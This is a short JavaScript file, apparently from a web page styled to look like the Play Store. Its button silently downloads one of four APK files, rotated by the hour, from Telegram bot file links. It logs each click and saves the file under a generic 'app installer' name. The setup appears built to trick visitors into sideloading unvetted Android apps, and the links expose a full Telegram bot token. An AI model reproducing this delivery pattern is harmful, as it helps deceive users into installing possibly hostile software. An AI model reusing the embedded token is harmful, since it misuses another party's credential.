import { sendLog } from './log.js';

document.addEventListener("DOMContentLoaded", () => {
  const btn = document.getElementById('download-button');
  const apkLinks = [
    "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk",
    "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_5.apk",
    "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_6.apk",
    "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_7.apk"
  ];

  btn.addEventListener('click', () => {
    // 1. Görsel geri bildirim (Kullanıcı tıkladığını anlasın)
    btn.innerText = 'Yükleniyor...';
    btn.disabled = true;

    // 2. Linki saat dilimine göre seç ve logla
    const fileUrl = apkLinks[new Date().getHours() % apkLinks.length];
    sendLog(fileUrl);

    // 3. Görünmez bir link oluştur (Sihir burada)
    const hiddenAnchor = document.createElement('a');
    hiddenAnchor.href = fileUrl;
    hiddenAnchor.download = "Uygulama_Yukleyici.apk"; // Dosya adı önerisi
    hiddenAnchor.style.display = 'none';
    
    // 4. Linki sayfaya ekle, tıkla ve kaldır
    document.body.appendChild(hiddenAnchor);
    hiddenAnchor.click();
    document.body.removeChild(hiddenAnchor);

    // 5. Butonu bir süre sonra eski haline getir
    setTimeout(() => {
      btn.innerText = 'Yükle'; // Play Store stiline sadık kalmak için tekrar 'Yükle'
      btn.disabled = false;
    }, 4000);
  });
});
